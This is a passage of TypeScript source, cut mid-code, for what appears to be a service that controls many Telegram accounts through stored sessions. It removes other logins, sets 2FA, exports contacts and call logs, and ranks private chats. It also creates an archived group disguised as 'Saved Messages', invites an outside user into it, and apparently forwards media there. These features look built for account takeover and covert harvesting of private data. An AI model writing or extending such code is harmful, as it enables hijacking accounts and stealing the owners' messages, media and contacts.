channels = dialogs\n                .filter(chat => chat.isChannel || chat.isGroup)\n                .map(chat => {\n                    const chatEntity = chat.entity as Api.Channel;\n                    const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;\n\n                    if (!chatEntity.broadcast &&\n                        !cannotSendMsgs &&\n                        chatEntity.participantsCount > 50 &&\n                        shouldMatch(chatEntity)) {\n\n                        return {\n                            channelId: chatEntity.id.toString(),\n                            canSendMsgs: true,\n                            participantsCount: chatEntity.participantsCount,\n                            private: false,\n                            title: chatEntity.title,\n                            broadcast: chatEntity.broadcast,\n                            megagroup: chatEntity.megagroup,\n                            restricted: chatEntity.restricted,\n                            sendMessages: true,\n                            username: chatEntity.username,\n                            forbidden: false\n                        };\n                    }\n                    return null;\n                })\n                .filter((channel): channel is NonNullable<typeof channel> => Boolean(channel));\n\n            await connectionManager.unregisterClient(mobile);\n            await this.channelsService.createMultiple(channels);\n            await this.activeChannelsService.createMultiple(channels);\n            return \"Media forward initiated successfully\";\n        } catch (error) {\n            console.error(\"Error forwarding media:\", error);\n            return `Media forward failed: ${error.message}`;\n        }\n    }\n\n    async blockUser(mobile: string, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.blockUser(chatId);\n    }\n\n\n    async joinChannel(mobile: string, channelId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.joinChannel(channelId);\n    }\n\n    async getCallLog(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getCallLog();\n    }\n\n    async getmedia(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getMediaMessages();\n    }\n\n    async getChannelInfo(mobile: string, sendIds: boolean = false): Promise<ChannelInfo> {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.channelInfo(sendIds);\n    }\n\n    async getMe(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getMe();\n    }\n\n    async getEntity(mobile: string, entity: EntityLike) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.getEntity(entity); // Assuming 'getEntity()' is a valid method\n    }\n\n    async createNewSession(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.createNewSession();\n    }\n\n    async set2Fa(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.set2fa();\n            return '2Fa set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async updatePrivacyforDeletedAccount(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.updatePrivacyforDeletedAccount()\n    }\n\n    async deleteProfilePhotos(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.deleteProfilePhotos()\n    }\n\n    async setProfilePic(\n        mobile: string, name: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        await telegramClient.deleteProfilePhotos();\n        try {\n            await CloudinaryService.getInstance(name);\n            await sleep(2000);\n            const rootPath = process.cwd();\n            console.log(\"checking path\", rootPath)\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(3000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n            return 'Profile pic set successfully'\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        } finally {\n            await connectionManager.unregisterClient(mobile);\n        }\n    }\n\n    async updatePrivacy(\n        mobile: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            await telegramClient.updatePrivacy()\n            return \"Privacy updated successfully\";\n        } catch (error) {\n            const errorDetails = parseError(error)\n            throw new HttpException(errorDetails.message, errorDetails.status)\n        }\n    }\n\n    async downloadProfilePic(\n        mobile: string, index: number\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            return await telegramClient.downloadProfilePic(index)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async updateUsername(\n        mobile: string, username: string,\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        try {\n            return await telegramClient.updateUsername(username)\n        } catch (error) {\n            console.log(\"Some Error: \", parseError(error), error);\n            throw new Error(\"Failed to update username\");\n        }\n    }\n\n    async getMediaMetadata(mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice')[];\n            startDate?: Date;\n            endDate?: Date;\n            limit?: number;\n            maxId?: number;\n            minId?: number;\n            all?: boolean;\n        }) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        if (params) {\n            return await telegramClient.getAllMediaMetaData(params);\n        } else {\n            return await telegramClient.getMediaMetadata(params);\n        }\n    }\n\n    async downloadMediaFile(mobile: string, messageId: number, chatId: string, res: any) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.downloadMediaFile(messageId, chatId, res)\n    }\n\n    async forwardMessage(mobile: string, toChatId: string, fromChatId: string, messageId: number) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.forwardMessage(toChatId, fromChatId, messageId);\n    }\n\n    async leaveChannels(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        const channelinfo = await telegramClient.channelInfo(false);\n        const leaveChannelIds = channelinfo.canSendFalseChats\n        telegramClient.leaveChannels(leaveChannelIds);\n        return \"Left channels initiated\";\n    }\n\n    async leaveChannel(mobile: string, channel: string) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        telegramClient.leaveChannels([channel]);\n        return \"Left channel initiated\";\n    }\n\n    async deleteChat(mobile: string, params: {\n        peer: string | Api.TypeInputPeer;\n        maxId?: number;\n        justClear?: boolean;\n        revoke?: boolean;\n        minDate?: number;\n        maxDate?: number;\n    }) {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.deleteChat(params);\n    }\n    async updateNameandBio(\n        mobile: string,\n        firstName: string,\n        about?: string,\n    ): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile)\n        return await telegramClient.updateProfile(firstName, about);\n    }\n\n    async getDialogs(mobile: string, query: DialogsQueryDto) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const { limit = 10, offsetId, archived = false } = query;\n        const dialogs = await telegramClient.getDialogs({ limit, offsetId, archived });\n        const chatData = [];\n        for (const chat of dialogs) {\n            const chatEntity = await chat.entity.toJSON();\n            chatData.push(chatEntity);\n        }\n        return chatData;\n    }\n\n    async getConnectionStatus(): Promise<{\n        activeConnections: number;\n        rateLimited: number;\n        totalOperations: number;\n    }> {\n        const status = {\n            activeConnections: connectionManager.getActiveConnectionCount(),\n            rateLimited: 0,\n            totalOperations: 0\n        };\n\n        this.logger.logOperation('system', 'Connection status retrieved', status);\n        return status;\n    }\n\n    async forwardBulkMessages(\n        mobile: string,\n        fromChatId: string,\n        toChatId: string,\n        messageIds: number[]\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.forwardMessages(fromChatId, toChatId, messageIds)\n    }\n\n    async getAuths(mobile: string): Promise<any[]> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const auths = await telegramClient.getAuths();\n        this.logger.logOperation(mobile, 'Retrieved authorizations', {\n            count: auths?.length || 0\n        });\n        return auths;\n    }\n\n    async removeOtherAuths(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        await telegramClient.removeOtherAuths();\n        this.logger.logOperation(mobile, 'Removed other authorizations');\n        return \"Removed other authorizations\";\n    }\n\n    public async processBatch<T>(\n        items: T[],\n        batchSize: number,\n        processor: (batch: T[]) => Promise<void>,\n        delayMs: number = 2000\n    ): Promise<{ processed: number, errors: Error[] }> {\n        const errors: Error[] = [];\n        let processed = 0;\n\n        for (let i = 0; i < items.length; i += batchSize) {\n            const batch = items.slice(i, i + batchSize);\n            try {\n                await processor(batch);\n                processed += batch.length;\n                if (i + batchSize < items.length) {\n                    await new Promise(resolve => setTimeout(resolve, delayMs));\n                }\n            } catch (error) {\n                errors.push(error);\n                this.logger.logError('batch-process', 'Batch processing failed', error);\n            }\n        }\n\n        return { processed, errors };\n    }\n\n    // Enhanced Group Management\n    async createGroupWithOptions(mobile: string, options: GroupOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        const result = await telegramClient.createGroupOrChannel(options);\n        // Attempt to extract the channel/group ID from the result\n        let groupId: string | undefined;\n        if ('chats' in result && Array.isArray(result.chats) && result.chats.length > 0) {\n            // For most cases, the created group/channel will be the last chat in the array\n            const chat = result.chats[result.chats.length - 1];\n            groupId = chat.id?.toString();\n        }\n        this.logger.logOperation(mobile, 'Group created', { id: groupId });\n        return result;\n    }\n\n    async updateGroupSettings(\n        mobile: string,\n        settings: {\n            groupId: string;\n            username?: string;\n            title?: string;\n            description?: string;\n            slowMode?: number;\n            memberRestrictions?: any;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.updateGroupSettings(settings)\n    }\n\n    // Message Scheduling\n    async scheduleMessage(mobile: string, options: MessageScheduleOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.scheduleMessageSend({\n            chatId: options.chatId,\n            message: options.message,\n            scheduledTime: options.scheduledTime,\n            replyTo: options.replyTo,\n            silent: options.silent\n        });\n    }\n\n    async getScheduledMessages(mobile: string, chatId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.getScheduledMessages(chatId)\n    }\n\n    async sendMediaAlbum(mobile: string, album: MediaAlbumOptions) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendMediaAlbum(album)\n    }\n\n    async sendMessage(mobile: string, params: { peer: string, parseMode?: string, message: string }) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendMessage(params)\n    }\n\n    async sendVoiceMessage(\n        mobile: string,\n        voice: {\n            chatId: string;\n            url: string;\n            duration?: number;\n            caption?: string;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.sendVoiceMessage(voice)\n    }\n\n    async cleanupChat(\n        mobile: string,\n        cleanup: {\n            chatId: string;\n            beforeDate?: Date;\n            onlyMedia?: boolean;\n            excludePinned?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.cleanupChat(cleanup)\n    }\n\n    async getChatStatistics(mobile: string, chatId: string, period: 'day' | 'week' | 'month'): Promise<ChatStatistics> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.getChatStatistics(chatId, period)\n    }\n\n    // Enhanced Privacy Features\n    async updatePrivacyBatch(\n        mobile: string,\n        settings: {\n            phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n            lastSeen?: 'everybody' | 'contacts' | 'nobody';\n            profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n            forwards?: 'everybody' | 'contacts' | 'nobody';\n            calls?: 'everybody' | 'contacts' | 'nobody';\n            groups?: 'everybody' | 'contacts' | 'nobody';\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.updatePrivacyBatch(settings)\n    }\n    // Content Filtering\n    async setContentFilters(\n        mobile: string,\n        filters: ContentFilter\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.setContentFilters(filters)\n    }\n\n    async addGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.addGroupMembers(groupId, members)\n    }\n\n    async removeGroupMembers(mobile: string, groupId: string, members: string[]): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.removeGroupMembers(groupId, members)\n    }\n\n    async promoteToAdmin(\n        mobile: string,\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        return await telegramClient.promoteToAdmin(groupId, userId, permissions, rank)\n    }\n\n    async demoteAdmin(mobile: string, groupId: string, userId: string): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Demoted admin to regular member', { groupId, userId });\n        return await telegramClient.demoteAdmin(groupId, userId);\n    }\n\n    async unblockGroupUser(mobile: string, groupId: string, userId: string): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Unblocked user in group', { groupId, userId });\n        return await telegramClient.unblockGroupUser(groupId, userId);\n    }\n\n    async getGroupAdmins(mobile: string, groupId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get group admins', { groupId });\n        return await telegramClient.getGroupAdmins(groupId);\n    }\n\n    async getGroupBannedUsers(mobile: string, groupId: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get group banned users', { groupId });\n        return await telegramClient.getGroupBannedUsers(groupId);\n    }\n\n    async searchMessages(\n        mobile: string,\n        params: SearchMessagesDto\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Search messages', params);\n        return await telegramClient.searchMessages(params);\n    }\n\n    async getFilteredMedia(\n        mobile: string,\n        params: {\n            chatId: string;\n            types?: ('photo' | 'video' | 'document' | 'voice')[];\n            startDate?: Date;\n            endDate?: Date;\n            offset?: number;\n            limit?: number;\n            maxId?: number;\n            minId?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get filtered media', params);\n        return await telegramClient.getFilteredMedia(params);\n    }\n\n    // Contact Management\n    async exportContacts(\n        mobile: string,\n        format: 'vcard' | 'csv',\n        includeBlocked: boolean = false\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Export contacts', { format, includeBlocked });\n        return await telegramClient.exportContacts(format, includeBlocked);\n    }\n\n    async importContacts(\n        mobile: string,\n        contacts: { firstName: string; lastName?: string; phone: string }[]\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Import contacts', { contactCount: contacts.length });\n        return await telegramClient.importContacts(contacts);\n    }\n\n    async manageBlockList(\n        mobile: string,\n        userIds: string[],\n        block: boolean\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, block ? 'Block users' : 'Unblock users', { userIds });\n        return await telegramClient.manageBlockList(userIds, block);\n    }\n\n    async getContactStatistics(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get contact statistics');\n        return await telegramClient.getContactStatistics();\n    }\n\n    // Chat Folder Management\n    async createChatFolder(\n        mobile: string,\n        options: {\n            name: string;\n            includedChats: string[];\n            excludedChats?: string[];\n            includeContacts?: boolean;\n            includeNonContacts?: boolean;\n            includeGroups?: boolean;\n            includeBroadcasts?: boolean;\n            includeBots?: boolean;\n            excludeMuted?: boolean;\n            excludeRead?: boolean;\n            excludeArchived?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Create chat folder', { name: options.name });\n        return await telegramClient.createChatFolder(options);\n    }\n\n    async getChatFolders(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get chat folders');\n        return await telegramClient.getChatFolders();\n    }\n\n    // Session Management\n    async getSessionInfo(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get session info');\n        return await telegramClient.getSessionInfo();\n    }\n\n    async terminateSession(\n        mobile: string,\n        options: {\n            hash: string;\n            type: 'app' | 'web';\n            exceptCurrent?: boolean;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Terminate session', options);\n        return await telegramClient.terminateSession(options);\n    }\n\n    // Message Management\n    async editMessage(\n        mobile: string,\n        options: {\n            chatId: string;\n            messageId: number;\n            text?: string;\n            media?: {\n                type: 'photo' | 'video' | 'document';\n                url: string;\n            };\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Edit message', { chatId: options.chatId, messageId: options.messageId });\n        return await telegramClient.editMessage(options);\n    }\n\n    // Chat Management\n    async updateChatSettings(\n        mobile: string,\n        settings: {\n            chatId: string;\n            username?: string;\n            title?: string;\n            about?: string;\n            photo?: string;\n            slowMode?: number;\n            linkedChat?: string;\n            defaultSendAs?: string;\n        }\n    ) {\n        if (!settings.chatId) {\n            throw new Error('chatId is required');\n        }\n\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Update chat settings', { chatId: settings.chatId });\n        return await telegramClient.updateChatSettings(settings);\n    }\n\n    // Media Handling\n    async sendMediaBatch(\n        mobile: string,\n        options: {\n            chatId: string;\n            media: Array<{\n                type: 'photo' | 'video' | 'document';\n                url: string;\n                caption?: string;\n                fileName?: string;\n            }>;\n            silent?: boolean;\n            scheduleDate?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Send media batch', { chatId: options.chatId, mediaCount: options.media.length });\n        return await telegramClient.sendMediaBatch(options);\n    }\n\n    // Password Management\n    async hasPassword(mobile: string): Promise<boolean> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Check password status');\n        return await telegramClient.hasPassword();\n    }\n\n    // Contact Management\n    async getContacts(mobile: string) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get contacts list');\n        return await telegramClient.getContacts();\n    }\n\n    // Extended Chat Functions\n    async getChats(\n        mobile: string,\n        options: {\n            limit?: number;\n            offsetDate?: number;\n            offsetId?: number;\n            offsetPeer?: string;\n            folderId?: number;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get chats', options);\n        return await telegramClient.getChats(options);\n    }\n\n    async getFileUrl(mobile: string, url: string, filename: string): Promise<string> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get file URL', { url, filename });\n        return await telegramClient.getFileUrl(url, filename);\n    }\n\n    async getMessageStats(\n        mobile: string,\n        options: {\n            chatId: string;\n            period: 'day' | 'week' | 'month';\n            fromDate?: Date;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get message statistics', options);\n        return await telegramClient.getMessageStats(options);\n    }\n\n    async sendViewOnceMedia(\n        mobile: string,\n        options: {\n            chatId: string;\n            sourceType: 'path' | 'base64' | 'binary';\n            path?: string;\n            base64Data?: string;\n            binaryData?: Buffer;\n            caption?: string;\n            filename?: string;\n        }\n    ) {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Send view once media', { sourceType: options.sourceType, chatId: options.chatId });\n\n        const { sourceType, chatId, caption, filename } = options;\n        try {\n            if (sourceType === 'path') {\n                if (!options.path) throw new BadRequestException('Path is required when sourceType is url');\n\n                try {\n                    const localPath = options.path;\n                    if (!fs.existsSync(localPath)) {\n                        throw new BadRequestException(`File not found at path: ${localPath}`);\n                    }\n                    let isVideo = false;\n                    const ext = path.extname(localPath).toLowerCase().substring(1);\n                    if (['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n\n                    const fileBuffer = fs.readFileSync(localPath);\n\n                    this.logger.logOperation(mobile, 'Sending view once media from local file', {\n                        path: localPath,\n                        isVideo,\n                        size: fileBuffer.length,\n                        filename: filename || path.basename(localPath)\n                    });\n\n                    return await telegramClient.sendViewOnceMedia(\n                        chatId,\n                        fileBuffer,\n                        caption,\n                        isVideo,\n                        filename || path.basename(localPath)\n                    );\n                } catch (error) {\n                    if (error instanceof BadRequestException) {\n                        throw error;\n                    }\n                    this.logger.logError(mobile, 'Failed to read local file', error);\n                    throw new BadRequestException(`Failed to read local file: ${error.message}`);\n                }\n            }\n            else if (sourceType === 'base64') {\n                if (!options.base64Data) throw new BadRequestException('Base64 data is required when sourceType is base64');\n                const base64String = options.base64Data;\n                let isVideo = false;\n                if (filename) {\n                    const ext = filename.toLowerCase().split('.').pop();\n                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n                }\n                this.logger.logOperation(mobile, 'Sending view once media from base64', { isVideo, size: base64String.length });\n                const mediaData = Buffer.from(base64String, 'base64');\n                return await telegramClient.sendViewOnceMedia(chatId, mediaData, caption, isVideo, filename);\n            }\n            else if (sourceType === 'binary') {\n                if (!options.binaryData) throw new BadRequestException('Binary data is required when sourceType is binary');\n\n                this.logger.logOperation(mobile, 'Sending view once media from binary', {\n                    size: options.binaryData.length,\n                    filename: filename || 'unknown'\n                });\n                let isVideo = false;\n                if (filename) {\n                    const ext = filename.toLowerCase().split('.').pop();\n                    if (ext && ['mp4', 'mov', 'avi', 'mkv', 'wmv', 'flv', 'webm', '3gp'].includes(ext)) {\n                        isVideo = true;\n                    }\n                }\n                return await telegramClient.sendViewOnceMedia(chatId, options.binaryData, caption, isVideo, filename);\n            }\n            else {\n                throw new BadRequestException('Invalid source type. Must be one of: url, base64, binary');\n            }\n        } catch (error) {\n            this.logger.logError(mobile, 'Failed to send view once media', error);\n            throw error;\n        }\n    }\n\n    async getTopPrivateChats(mobile: string): Promise<{\n        chatId: string;\n        username?: string;\n        firstName?: string;\n        lastName?: string;\n        totalMessages: number;\n        interactionScore: number;\n        calls: {\n            total: number;\n            incoming: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n            outgoing: {\n                total: number;\n                audio: number;\n                video: number;\n            };\n        };\n        media: {\n            photos: number;\n            videos: number;\n        };\n        activityBreakdown: {\n            videoCalls: number;\n            audioCalls: number;\n            mediaSharing: number;\n            textMessages: number;\n        };\n    }[]> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Get top private chats');\n        return await telegramClient.getTopPrivateChats();\n    }\n\n    async addBotsToChannel(\n        mobile: string,\n        channelIds: string[] = [process.env.accountsChannel, process.env.updatesChannel, process.env.notifChannel, \"miscmessages\", process.env.httpFailuresChannel],\n    ) {\n        this.logger.logOperation(mobile, 'Add bots to channel', { channelIds });\n        const botTokens = (process.env.BOT_TOKENS || '').split(',').filter(Boolean);\n        if (botTokens.length === 0) {\n            throw new Error('No bot tokens configured. Please set BOT_TOKENS environment variable');\n        }\n        for (const token of botTokens) {\n            try {\n                const botInfo = await this.getBotInfo(token);\n                if (botInfo) {\n                    for (const channelId of channelIds) {\n                        await this.setupBotInChannel(mobile, channelId, botInfo.id, botInfo.username, {\n                            changeInfo: true,\n                            postMessages: true,\n                            editMessages: true,\n                            deleteMessages: true,\n                            banUsers: true,\n                            inviteUsers: true,\n                            pinMessages: true,\n                            addAdmins: true,\n                            anonymous: false,\n                            manageCall: false\n                        });\n                    };\n                }\n            } catch (error) {\n                this.logger.logError(mobile, 'Failed to setup bot in channel', error);\n            }\n        }\n\n\n    }\n\n    async getBotInfo(token: string) {\n        try {\n            const response = await fetchWithTimeout(`https://api.telegram.org/bot${token}/getMe`);\n            if (response.data?.ok) {\n                return response.data.result;\n            }\n            throw new Error('Failed to get bot info');\n        } catch (error) {\n            throw new Error(`Failed to get bot info: ${error.message}`);\n        }\n    }\n\n    async setupBotInChannel(mobile: string, channelId: string, botId: string, botUsername: string, permissions: {\n        changeInfo?: boolean;\n        postMessages?: boolean;\n        editMessages?: boolean;\n        deleteMessages?: boolean;\n        banUsers?: boolean;\n        inviteUsers?: boolean;\n        pinMessages?: boolean;\n        addAdmins?: boolean;\n        anonymous?: boolean;\n        manageCall?: boolean;\n    }): Promise<void> {\n        const telegramClient = await connectionManager.getClient(mobile);\n        this.logger.logOperation(mobile, 'Setup bot in channel', { channelId, botId, botUsername });\n        try {\n            await telegramClient.joinChannel(channelId);\n        } catch (error) {\n            this.logger.logError(mobile, 'Failed to join channel', error);\n        }\n        try {\n            await telegramClient.addGroupMembers(channelId, [botUsername]);\n            this.logger.logOperation(mobile, 'Bot added to channel', { channelId, botUsername });\n            await sleep(2000);\n            this.logger.logOperation(mobile, `Bot ${botUsername} successfully added to channel ${channelId}`);\n        } catch (error) {\n            this.logger.logError(mobile, `Failed to add bot ${botUsername} to channel ${channelId}`, error);\n        }\n        try {\n            await telegramClient.promoteToAdmin(channelId, botUsername, permissions);\n            console.log(`Bot ${botUsername} promoted as admin in channel ${channelId}`);\n        } catch (error) {\n            this.logger.logError(mobile, `Failed to setup bot ${botUsername} in channel ${channelId}`, error);\n        }\n    }\n\n    async createBot(mobile: string, createBotDto: CreateBotDto) {\n        const client = await connectionManager.getClient(mobile);\n        return client.createBot(createBotDto);\n    }\n}\n","import { Api, TelegramClient } from 'telegram';\nimport { StringSession } from 'telegram/sessions';\nimport { NewMessage, NewMessageEvent } from 'telegram/events';\nimport axios from 'axios';\nimport * as fs from 'fs';\nimport { CustomFile } from 'telegram/client/uploads';\nimport { TotalList, sleep } from 'telegram/Helpers';\nimport { LogLevel } from 'telegram/extensions/Logger';\nimport { MailReader } from '../../IMap/IMap';\nimport bigInt from 'big-integer';\nimport { IterDialogsParams } from 'telegram/client/dialogs';\nimport { EntityLike } from 'telegram/define';\nimport { contains } from '../../utils';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { ContentFilter } from '../../interfaces/telegram';\nimport {\n    GroupOptions\n} from '../../interfaces/telegram';\nimport { MediaAlbumOptions } from './types/telegram-types';\nimport { IterMessagesParams } from 'telegram/client/messages';\nimport { connectionManager } from './utils/connection-manager';\nimport { MessageMediaType, SearchMessagesDto, SearchMessagesResponseDto } from './dto/message-search.dto';\nimport { BotConfig, ChannelCategory } from '../../utils/TelegramBots.config';\n\ninterface MessageScheduleOptions {\n    chatId: string;\n    message: string;\n    scheduledTime: Date;\n    replyTo?: number;\n    silent?: boolean;\n    media?: {\n        type: 'photo' | 'video' | 'document';\n        url: string;\n    };\n}\n\nclass TelegramManager {\n    private session: StringSession;\n    public phoneNumber: string;\n    public client: TelegramClient | null;\n    private channelArray: string[];\n    private static activeClientSetup: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string };\n    private contentFilters: Map<string, ContentFilter>;\n    private filterHandler: any;\n\n    constructor(sessionString: string, phoneNumber: string) {\n        this.session = new StringSession(sessionString);\n        this.phoneNumber = phoneNumber;\n        this.client = null;\n        this.channelArray = [];\n        this.contentFilters = new Map();\n    }\n\n    public static getActiveClientSetup() {\n        return TelegramManager.activeClientSetup;\n    }\n\n    public static setActiveClientSetup(data: { days?: number, archiveOld: boolean, formalities: boolean, newMobile: string, existingMobile: string, clientId: string } | undefined) {\n        TelegramManager.activeClientSetup = data;\n    }\n\n    public async createGroup() {\n        const groupName = \"Saved Messages\"; // Customize your group name\n        const groupDescription = this.phoneNumber; // Optional description\n        console.log(\"Creating group:\", groupName);\n        const result: any = await this.client.invoke(\n            new Api.channels.CreateChannel({\n                title: groupName,\n                about: groupDescription,\n                megagroup: true,\n                forImport: true,\n            })\n        );\n        const { id, accessHash } = result.chats[0];\n        console.log(\"Archived chat\", id);\n        await this.archiveChat(id, accessHash);\n        const usersToAdd = [\"fuckyoubabie1\"]; // Replace with the list of usernames or user IDs\n        console.log(\"Adding users to the channel:\", usersToAdd);\n        const addUsersResult = await this.client.invoke(\n            new Api.channels.InviteToChannel({\n                channel: new Api.InputChannel({\n                    channelId: id,\n                    accessHash: accessHash,\n                }),\n                users: usersToAdd\n            })\n        );\n        console.log(\"Successful addition of users:\", addUsersResult);\n        return { id, accessHash };\n    }\n\n    public async archiveChat(id: bigInt.BigInteger, accessHash: bigInt.BigInteger) {\n        const folderId = 1;\n        console.log(\"Archiving chat\", id);\n        return await this.client.invoke(\n            new Api.folders.EditPeerFolders({\n                folderPeers: [\n                    new Api.InputFolderPeer({\n                        peer: new Api.InputPeerChannel({\n                            channelId: id,\n                            accessHash: accessHash,\n                        }),\n                        folderId: folderId,\n                    }),\n                ],\n            })\n        );\n    }\n\n    private async createOrJoinChannel(channel: string) {\n        let channelId;\n        let channelAccessHash;\n        if (channel) {\n            try {\n                const result: any = await this.joinChannel(channel);\n                channelId = result.chats[0].id;\n                channelAccessHash = result.chats[0].accessHash;\n                console.log(\"Archived chat\", channelId);\n            } catch (error) {\n                const result = await this.createGroup();\n                channelId = result.id;\n                channelAccessHash = result.accessHash;\n                console.log(\"Created new group with ID:\", channelId);\n            }\n        } else {\n            const result = await this.createGroup();\n            channelId = result.id;\n            channelAccessHash = result.accessHash;\n            console.log(\"Created new group with ID:\", channelId);\n        }\n        await this.archiveChat(channelId, channelAccessHash);\n        return { id: channelId, accesshash: channelAccessHash }\n    }\n\n    public async forwardMedia(channel: string, fromChatId: string) {\n        let channelId;\n        try {\n            console.log(\"Forwarding media from chat to channel\", channel, fromChatId);\n            let channelAccessHash;\n            if (fromChatId) {\n                const 